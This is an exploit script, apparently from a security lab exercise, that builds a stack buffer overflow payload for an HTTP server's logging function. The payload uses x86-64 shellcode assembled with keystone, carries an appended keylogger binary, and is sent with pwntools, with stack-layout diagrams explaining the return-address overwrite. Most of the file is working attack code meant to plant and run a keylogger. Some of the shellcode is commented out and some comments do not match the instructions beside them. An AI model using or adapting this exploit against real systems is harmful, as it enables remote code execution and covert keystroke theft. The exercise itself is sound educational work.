'''
[FINDINGS]
General flow:
1) Sent request
2) handle_client: Receives the whole request and sends the response back to the client using its file descriptor after rest of processing
3) parse_request: Parses the request in arg:request_buf, logs only (!!) the request header, receives any remaining body data, 
                  executes the request, and builds a response in arg:response_buf
4) log_message: Logs arg:message to stdout and to a file

In the handle_client function a space of 0x500018 is allocated on the stack in comparison to 0x518 in scenario 1.
So we have space for approx 5114 KB instead of the previous 1 KB which offers us enough space to also store the keylogger.
This space is mostly used for the request_buffer of parse_request which is 0x4fffff big.

Next the goal is the same as in scenario 1, crash the server so N = 1 again and next sent the payload to run the keylogger,
but now we also need to sent the keylogger first and execute this keylogger which is now located on the stack in the space
from previous alinea.

To do this we don't put the keylogger inside the stack frame of log_message but just append it to the payload
after the spot to place the return address to the shellcode and reference the start of the keylogger
in that shell code. Now we just execute this binary which is now located on the stack.
'''

from keystone import *
from pwn import *

### CONFIGS ###
port = 8080

message_buffer_start = 0x7ffff75d1ea0
keylogger_start_address = 0x7ffff75d22d1
              
original_rbp = 0x7ffff75d1e20 # the rbp value before the 'ret' instruction executed 
log_buffer_rbp_offset = 0x450 # the log buffer starts at $original_rbp-0x450
log_buffer_prefix = 49 # the server already adds 49 bytes at start of the log buffer

### PAYLOAD ###
message_prefix = b"GET /data.txt HTTP/1.1\r\n"
message_prefix_len = len(message_prefix)

### CREATE THE CRASH PAYLOAD ###
crash = message_prefix
padding_size = log_buffer_rbp_offset + 8 - log_buffer_prefix - len(crash) # extra 8 bytes to account for the caller's rbp
crash += b"q" * padding_size # add padding
crash += 0xffffffffffffffff.to_bytes(8, "little") # add new little endian return address
crash += b"\r\n\r\n"


### CREATE THE ATTACK PAYLOAD ###
# Load the keylogger binary file keylogger.exe
with open("./scenario_3/keylogger_small", "rb") as file:
  keylogger = file.read()
  
# Remove all null bytes from the keylogger
keylogger = bytes(keylogger)
keylogger = keylogger.replace(b"\x00", b"")
keylogger_len = len(keylogger)

# File name
keylogger_name = b"keylogger"
keylogger_name_len = len(keylogger_name)
keylogger_name_address = keylogger_start_address - keylogger_len

# Shell code the runs the keylogger
shell_code = f"""
  # Open the file
  mov rdi, {keylogger_name_address}                # Clear rdi (filename)
  mov rsi, 0x40              # Argument: O_CREAT | O_WRONLY | O_TRUNC (0644)
  mov rdx, 0x1FF             # Argument: file permissions (0777)
  mov rax, 0x2               # Syscall number for open
  syscall

  # Store the file descriptor
  mov r8, rax

  # Close the file
  xor rdi, rdi               # Clear rdi (file descriptor)
  mov rax, 0x3               # Syscall number for close
  syscall

  # Copy the keylogger from the stack to the file
  # mov rdi, r8                # File descriptor
  # lea rsi, {keylogger_start_address} # Pointer to the keylogger
  # mov rdx, {keylogger_len}   # Length of the keylogger
  # mov rax, 0x1               # Syscall number for write
  # syscall

  # Execute the keylogger
  # lea rdi, {keylogger_name_address} # ptr to injected "./keylogger"
  # lea rsi, {keylogger_name_address - keylogger_name_len} # argv: ptr to placeholder (future NULL ptr)
  # lea rdx, {keylogger_name_address - keylogger_name_len} # envp (= argv)
  # put a NULL ptr in the placeholder
  # xor rax, rax
  # mov [rdx], rax
  # perform the execve syscall
  # mov al, 59
  # syscall
"""
ks = Ks(KS_ARCH_X86, KS_MODE_64)
encoding, _ = ks.asm(shell_code)

# build the payload
sc3_exploit = message_prefix
sc3_exploit += bytes(encoding) # add assembled shell code
padding_size = log_buffer_rbp_offset + 8 - log_buffer_prefix - len(sc3_exploit) # len includes the 24 bytes
sc3_exploit += b"q" * padding_size # add padding
retaddr = original_rbp - log_buffer_rbp_offset + log_buffer_prefix + message_prefix_len # the new (absolute) return address points to the first byte of the shell code
sc3_exploit += retaddr.to_bytes((retaddr.bit_length() + 7) // 8, byteorder = "little") # add new little endian return address without trailing null bytes
sc3_exploit += b"\r\n\r\n"
sc3_exploit += keylogger
sc3_exploit += keylogger_name 

### PERFORM ATTACK ###q
#remote("localhost", port).send(crash) # send crash payload
# sleep(2) # let the server restart
# Perform Attack
remote("localhost", port).send(sc3_exploit) # send attack payload


# details for 'payload_rsp_offset':
#
# stack representation after return to the injected shell code:
#
#                            current_rsp <┐            ┌> original_rbp           ┌> start of vulnerable buffer
#                                         |            |                         |
#                                         ||<---0x10-->|<---------0x450--------->|
# stack: <high addresses> =|======<1>======|retaddr|<2>|===========<3>===========| <low addresses>  (stack grow direction -->)
#                          |               |           |<5>|=========<4>=========|
#                          └> current_rbp  |               |==<6>==|==<7>=|==<8>=|
#                                          |                       |<-24->|<-49->|
#                                          |<--payload_rsp_offset->|
#                                                                  └> start of injected payload
# Legend:
#   <1>: caller stack frame
#   <2>: spilled rbp of the caller
#   <3>: log_message stack frame
#   <4>: vulnerable buffer
#   <5>: other local variables   -> 5 VARS so 0x20 big
#   <6>: injected payload
#   <7>: "GET /data.txt HTTP/1.1\r\n"
#   <8>: "== Request from..."